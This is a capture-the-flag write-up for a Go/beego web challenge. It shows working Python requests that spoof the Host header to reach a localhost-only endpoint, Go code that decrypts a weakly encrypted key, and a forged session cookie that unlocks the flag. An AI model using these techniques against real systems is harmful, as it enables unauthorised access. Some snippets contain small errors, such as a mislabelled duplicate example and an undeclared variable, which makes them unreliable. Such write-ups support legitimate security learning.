# CAFE

```
score: 100
solved: xx/xx
difficulty: NA
tags: web, golang, beego, AES, re
```

## Problem

http://3.39.49.174:30001/

and file superbee.zip

## Got the flag
Visit the site got a 404 page, seems default 404 of beego

```
Not Found

The page you have requested has flown the coop.
Perhaps you are here because:

    The page has moved
    The page no longer exists
    You were looking for your puppy and got lost
    You like 404 pages

Go Home
Powered by beego 2.0.0
```

Download & unzip the file

```sh
Archive:  superbee.zip
   creating: superbee/
   creating: superbee/conf/
  inflating: superbee/conf/app.conf
  inflating: superbee/go.mod
  inflating: superbee/go.sum
  inflating: superbee/main.go
   creating: superbee/views/
  inflating: superbee/views/index.html
  inflating: superbee/views/login.html
```

It is a Go web app using the popular 27k GitHub stars [beego web framework](https://github.com/beego/beego).

beego uses config from `app.conf` file:

```
# conf/app.conf
app_name = superbee
auth_key = [----------REDEACTED------------]
id = admin
password = [----------REDEACTED------------]
flag = [----------REDEACTED------------]
```

Go program starts from function `main`, in this case, it located in file `main.go` (but it can be in any go file).

```go
func main() {
	app_name, _ = web.AppConfig.String("app_name")
	auth_key, _ = web.AppConfig.String("auth_key")
	auth_crypt_key, _ = web.AppConfig.String("auth_crypt_key")
	admin_id, _ = web.AppConfig.String("id")
	admin_pw, _ = web.AppConfig.String("password")
	flag, _ = web.AppConfig.String("flag")

	web.AutoRouter(&MainController{})
	web.AutoRouter(&LoginController{})
	web.AutoRouter(&AdminController{})
	web.Run()
}
```

the **most** important thing to notice here is the missing of `auth_crypt_key`, which is the key to reach the flag. Since the `auth_crypt_key` is missing, it uses value empty string `""`. This can empty string can be test by running the code and add print or read the doc.

List of functions in main.go:

```go
func AesEncrypt(origData, key []byte) ([]byte, error) {
func Padding(ciphertext []byte, blockSize int) []byte {
func Md5(s string) string {
func (this *BaseController) Prepare() {
func (this *MainController) Index() {
func (this *LoginController) Login() {
func (this *LoginController) Auth() {
func (this *AdminController) AuthKey() {
func main() {
```

beego AutoRouter setup routes to pages, see [doc](https://github.com/beego/beedoc/blob/v2.0.2/en-US/mvc/controller/router.md#auto-matching):

```
To use auto matching the controller must be registered as an auto-router.

web.AutoRouter(&controllers.ObjectController{})

Beego will retrieve all the methods in that controller by reflection. The related methods can be called like this:

/object/login   will call Login method of ObjectController
/object/logout  will call Logout method of ObjectController
```

Here we have 3 controllers, each would create a path `main/`, `login/` and `auth/`, its methods would be the next part of the path.

```go
func (this *LoginController) Auth() {
```
this function will be called when visit `/login/auth`.

Flag located in `/main/index` since it pass flag to the template to render.
```go
func (this *MainController) Index() {
	this.TplName = "index.html"
	this.Data["app_name"] = app_name
	this.Data["flag"] = flag
	this.Render()
}
```
and the template file views/index.html
```html
<html>
    <head>
        <title>{{.app_name}}</title>
    </head>
    <body>
        <h3>Index</h3>
        {{.flag}}
    </body>
```

so the target is to reach the `/main/index` page.

`Prepare` seems to be called before beego call any controller function.

```go
func (this *BaseController) Prepare() {
	controllerName, _ := this.GetControllerAndAction()
	session := this.Ctx.GetCookie(Md5("sess"))

	if controllerName == "MainController" {
		if session == "" || session != Md5(admin_id + auth_key) {
			this.Redirect("/login/login", 403)
			return
		}
	} else if controllerName == "LoginController" {
		if session != "" {
			this.Ctx.SetCookie(Md5("sess"), "")
		}
	} else if controllerName == "AdminController" {
		domain := this.Ctx.Input.Domain()

		if domain != "localhost" {
			this.Abort("Not Local")
			return
		}
	}
}
```
it decides logic when to open which page. The `MainController` is protected by
session that must equals to `Md5(admin_id + auth_key)`,  otherwise redirects to
login page.

The `AdminController` can only be reached if the domain equals to "localhost",
this controller has only 1 function:

```go
func (this *AdminController) AuthKey() {
	encrypted_auth_key, _ := AesEncrypt([]byte(auth_key), []byte(auth_crypt_key))
	this.Ctx.WriteString(hex.EncodeToString(encrypted_auth_key))
}
```

access `/admin/authkey` would return the `encrypted_auth_key`, uses Python requests:

```py
import requests
r =  requests.post('http://3.39.49.174:30001/admin/authkey', headers={'host': 'localhost'})
r.text
# output: 00fb3dcf5ecaad607aeb0c91e9b194d9f9f9e263cebd55cdf1ec2a327d033be657c2582de2ef1ba6d77fd22784011607
```

this was created by AesEncrypt using `auth_key` (secret) and `auth_crypt_key` (empty string). The AesEncrypt code:

```go
func AesEncrypt(origData, key []byte) ([]byte, error) {
	padded_key := Padding(key, 16)
	block, err := aes.NewCipher(padded_key)
	if err != nil {
		return nil, err
	}
	blockSize := block.BlockSize()
	origData = Padding(origData, blockSize)
	blockMode := cipher.NewCBCEncrypter(block, padded_key[:blockSize])
	crypted := make([]byte, len(origData))
	blockMode.CryptBlocks(crypted, origData)
	return crypted, nil
}

func Padding(ciphertext []byte, blockSize int) []byte {
	padding := blockSize - len(ciphertext)%blockSize
	padtext := bytes.Repeat([]byte{byte(padding)}, padding)
	return append(ciphertext, padtext...)
}
```

which is different from [example in go doc](https://pkg.go.dev/crypto/cipher#NewCBCEncrypter)

```go
 ciphertext := make([]byte, aes.BlockSize+len(plaintext))
 iv := ciphertext[:aes.BlockSize]
 if _, err := io.ReadFull(rand.Reader, iv); err != nil {
  panic(err)
 }

 mode := cipher.NewCBCEncrypter(block, iv)
 mode.CryptBlocks(ciphertext[aes.BlockSize:], plaintext)
```

this example create 16 random bytes as `iv` and used as 2nd argument to
`NewCBCEncrypter`, if change this to `Padding([]byte(""))`, the output would be
different and cannot decrypted using the [go doc example decrypt
code](https://pkg.go.dev/crypto/cipher#NewCBCDecrypter)

```go
// The IV needs to be unique, but not secure. Therefore it's common to
 // include it at the beginning of the ciphertext.
 ciphertext := make([]byte, aes.BlockSize+len(plaintext))
 iv := ciphertext[:aes.BlockSize]
 if _, err := io.ReadFull(rand.Reader, iv); err != nil {
  panic(err)
 }

 mode := cipher.NewCBCEncrypter(block, iv)
 mode.CryptBlocks(ciphertext[aes.BlockSize:], plaintext)
```

so we have to write our own AesDecrypt function.

```go
func AesDecrypt(ciphertext, key []byte) ([]byte, error) {
  block, err := aes.NewCipher(key)
  if err != nil {
   panic(err)
  }

  blockSize := block.BlockSize()
  mode := cipher.NewCBCDecrypter(block, key[:blockSize])

  mode.CryptBlocks(ciphertext, ciphertext)
  return ciphertext, nil
}

func main() {
  pk := Padding([]byte(""), 16)

  out, err = hex.DecodeString("00fb3dcf5ecaad607aeb0c91e9b194d9f9f9e263cebd55cdf1ec2a327d033be657c2582de2ef1ba6d77fd22784011607")
  if err != nil {
   log.Fatal(err)
  }
  pt, err := AesDecrypt(out, pk)
  if err != nil {
   log.Fatal(err)
  }
  fmt.Printf("pt: %s\n", pt)

  md5 := Md5("admin" + "Th15_sup3r_s3cr3t_K3y_N3v3r_B3_L34k3d")
  fmt.Printf("%s\n", Md5("sess"))
  fmt.Printf("%s\n", md5)
}
```

Put these md5 as cookie and send to index:

```py
import requests
r =  requests.get('http://3.39.49.174:30001/main/index', cookies={'f5b338d6bca36d47ee04d93d08c57861': 'e52f118374179d24fa20ebcceb95c2af'})
print(r.text)
```

We got the flag `codegate2022{d9adbe86f4ecc93944e77183e1dc6342}`

## Conclusion
beego is an unimportant part of the challenge, any other web framework can be used.
The biggest part of the challenge is write AES decrypt function.
But Go built-in `crypto` library is really greate here, everything is there, no installation,
and it's production ready. When comparing to Python, you would have to worry
about installing deprecated pycrypto or pycryptodome, may need to install a Rust
compiler, and/or have to go to read C code to understand things.
